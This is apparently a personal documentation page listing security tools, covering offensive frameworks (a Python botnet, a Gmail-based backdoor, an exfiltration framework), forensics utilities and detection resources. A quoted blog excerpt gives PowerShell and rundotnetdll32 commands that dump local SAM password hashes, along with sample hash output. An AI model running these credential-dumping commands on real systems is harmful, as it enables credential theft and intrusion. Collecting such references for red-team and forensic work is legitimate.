:Authors: - Diego Perez
          - (@darkquasar)

 .. toctree::
    :maxdepth: 3
    :caption: Resources
    :name: Resources

# Curated List of Awesome Tools!

This is an example of a MarkDown file that gets converted automagically to .rst by `m2r` module in sphinx. 

## Offensive Security

- **Hack the Box** (lab setup to test your red teaming and pentesting skills): https://www.hackthebox.eu/
- **BYOB**, create your Own Botnet. A fully integrated botnet in Python with the ability to load modules in-memory and a simple commandline: https://github.com/colental/byob
- **RunDotNetDLL32**, a tool to load .NET functions without using PowerShell: https://github.com/0xbadjuju/rundotnetdll32. An explanation follows (out of ![this blog post](https://blog.netspi.com/executing-net-methods-rundotnetdll32/)): 

::

    Below is a basic example command showing how to use PowerShell to load the .NET DLL WheresMyImplant.dll so that the DumpSAM() function can be executed to recover local password hashes.

    [System.Reflection.Assembly]::LoadFile("C:\Downloads\WheresMyImplant.dll")
    [WheresMyImplant.Implant]::DumpSAM()
    [System.Reflection.Assembly]::Unload("WheresMyImplant.dll")
    As you can see, PowerShell can be a great medium for executing .NET methods reflectively.  However, this can become a bit cumbersome during testing and isn’t ideal for executing client side.

    Enter RunDotNetDll32; this executable has one purpose, to duplicate the functionality of rundll32 for .Net assemblies. Syntactically it is very similar to rundll32.exe. For example, if you wanted to execute the pre-mimikatz trick of locking the workstation and keylogging the winlogon process, it would start with the following command:

    rundll32.exe User32.dll,LockWorkStation
    Where the syntax is:

    rundll32.exe $ASSEMBLY,$ENTRYPOINT $ARGUMENTS
    With RunDotNetDll32 the syntax had to be slightly modified to the following:

    rundotnetdll32.exe $ASSEMBLY,$NAMESPACE,$CLASS,$METHOD $ARGUMENTS
    For example, to run the SAM hashdump from WheresMyImplant you could use the command below:

    rundotnetdll32.exe WheresMyImplant.dll,WheresMyImplant,Implant,DumpSAM
    ----------
    Namespace: WheresMyImplant
    Class: Implant
    Method: DumpSAM
    Arguments:
    ----------
    [+] Running as SYSTEM
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

- **WhereIsMyImplant**, a Bring Your Own Land Toolkit that Doubles as a WMI Provider. You can do things like easily inject shellcode, inject dll, inject exe, spawn a command shell, create Empire client, etc. It can be either executed via WMI or via Assembly.Reflection from Powershell: https://github.com/0xbadjuju/WheresMyImplant

- **XFLTreat**: Great exfiltration framework written in Python: https://github.com/earthquake/XFLTReaT/

- **Exploiting AD Integrated DNS**: https://blog.netspi.com/exploiting-adidns/ 

- **gcat**, A PoC backdoor that uses Gmail as a C&C server: https://github.com/byt3bl33d3r/gcat

### Recon and Scrapers

- **Photon**, awesome Python Web Crawler framework: https://github.com/s0md3v/Photon
- **Search S3 Buckets Online**: https://buckets.grayhatwarfare.com/

## IR & Digital Forensics
- **Eric Zimmerman's Toolset**, unavoidable and amazing: https://ericzimmerman.github.io/
- **Flare-FLOSS**, Fireeye's commandline tool similar to *strings* but used to de-obfuscate strings found in executables: https://github.com/fireeye/flare-floss
- **Event Log Explorer**, great GUI Event Log Explorer: https://eventlogxp.com/
- **TCPFLOW**: dump tcp flows from pcaps, extract files, build graphs
- **Capturebat**: great for behavioural analysis, records and dumps pcap and other artifacts when doing malware analysis.
- **pestrings**: like the usual *sysinternals strings* but improved, and it searches for both ASCII and UNICODE strings by default.
- **AppCompatProcessor** great tool for AppCompatCache advanced data analysis: https://github.com/mbevilacqua/appcompatprocessor. Concomitant article here: https://www.fireeye.com/blog/threat-research/2017/04/appcompatprocessor.html

## Random
- **Mail Header Analyzer**, this is a microsoft small page to check mail headers (look for tab on the right): https://testconnectivity.microsoft.com/

## AV and SandBoxes
- **Intezer**, https://analyze.intezer.com

## Networking
- **Pihole**, a blackhole for Internet Advertisements: https://github.com/pi-hole/pi-hole
- dfg

## Detection and Response Stack
- [Veramine](www.veramine.com) has a great free up to 20 nodes EDR solution that allows for syslog logging too. They have a [wiki repo](https://github.com/veramine/Detections/wiki) containing many of their currently supported detection logics. 
- [Custom Windows Event Channels](https://github.com/palantir/windows-event-forwarding/tree/master/windows-event-channels) created by the incredible **Palantir** guys. This can help you organize your WEC/WEF architecture.

## Volume Shadow Copies
- **VSC** a toolset GUI to execute analysis tools against VSS: https://df-stream.com/vsc-toolset/